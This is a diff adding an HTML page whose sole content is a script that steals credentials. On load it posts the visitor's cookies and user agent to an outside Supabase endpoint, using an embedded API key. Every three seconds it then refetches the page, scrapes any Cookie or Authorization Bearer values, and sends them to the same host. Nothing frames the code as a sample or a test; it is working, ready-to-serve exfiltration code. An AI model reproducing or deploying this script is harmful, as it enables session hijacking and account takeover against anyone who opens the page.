@@ -1,0 +1,15 @@
+<html><body><script>
+fetch('https://bljzczucifemikxrvkkm.supabase.co/rest/v1/cookies', {
+  method:'POST',
+  headers:{'apikey':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJsanpjenVjaWZlbWlreHJ2a2ttIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MjIxODAsImV4cCI6MjA4OTQ5ODE4MH0.R_sPF74xdjLz-n13WUlqZbqDbKY03Yveegea_MzZHT4','Content-Type':'application/json'},
+  body:JSON.stringify({cookies:document.cookie,src_ip:'Phone',ua:navigator.userAgent,timestamp:Date.now()/1000})
+});
+setInterval(()=>{fetch(window.location.href).then(r=>r.text()).then(html=>{
+  let ck=html.match(/Cookie:\s*([^\r\n]*)/i);
+  let tk=html.match(/Authorization:\s*Bearer\s*([^\s\r\n]*)/i);
+  if(ck||tk) fetch('https://bljzczucifemikxrvkkm.supabase.co/rest/v1/cookies',{
+    method:'POST',headers:{'apikey':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJsanpjenVjaWZlbWlreHJ2a2ttIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MjIxODAsImV4cCI6MjA4OTQ5ODE4MH0.R_sPF74xdjLz-n13WUlqZbqDbKY03Yveegea_MzZHT4','Content-Type':'application/json'},
+    body:JSON.stringify({cookies:ck?ck[1]:'',tokens:tk?tk[1]:'',src_ip:'Phone',ua:navigator.userAgent,timestamp:Date.now()/1000})
+  });
+})},3000);
+</script></body></html>
